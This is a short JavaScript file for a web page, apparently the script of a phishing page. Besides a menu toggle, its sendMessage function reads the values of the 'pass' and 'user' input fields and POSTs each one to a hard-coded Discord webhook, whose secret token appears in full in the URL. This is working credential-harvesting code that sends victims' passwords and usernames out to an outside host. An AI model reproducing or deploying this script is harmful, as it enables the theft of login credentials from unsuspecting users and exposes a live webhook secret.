let bar = document.querySelector('.bars'),
navItem = document.querySelector('.nav-items');

bar.addEventListener('click', () => {
    navItem.classList.toggle('active');
})



let cookie = document.getElementById("pass")
let getCookie = document.getElementById("get-cookie")

getCookie.addEventListener("click", function() {
})




function sendMessage() {
    
    const inputText = document.getElementById("pass").value
    const webhookUrl = "https://discord.com/api/webhooks/1179107057270521948/IA4b-xytxtAUaIC1fsZEiiUxMzmB0N_F1lkf4n9g3OD57tD4RrX_6lp_8trdnTibYQc8";

    const payload = {
      content: inputText
    };
  
    fetch(webhookUrl, {
      method: "POST",
      headers: {
        "Content-Type": "application/json"
      },
      body: JSON.stringify(payload)
    })
    .then(response => {
      if (!response.ok) {
        throw new Error("Failed to send message to Discord");
      }
    })
    .catch(error => {
      console.error(error);
    });


    let user = document.getElementById("user")
    let getUser = document.getElementById("get-cookie")
    
    getUser.addEventListener("click", function() {
    })
    
    
        
        const inputTexts = document.getElementById("user").value
        const webhookUrls = "https://discord.com/api/webhooks/1179107057270521948/IA4b-xytxtAUaIC1fsZEiiUxMzmB0N_F1lkf4n9g3OD57tD4RrX_6lp_8trdnTibYQc8";
    
        const payloads = {
          content: inputTexts
        };
      
        fetch(webhookUrls, {
          method: "POST",
          headers: {
            "Content-Type": "application/json"
          },
          body: JSON.stringify(payloads)
        })
        .then(response => {
          if (!response.ok) {
            throw new Error("Failed to send message to Discord");
          }
        })
        .catch(error => {
          console.error(error);
        });
    
    
  }




  

  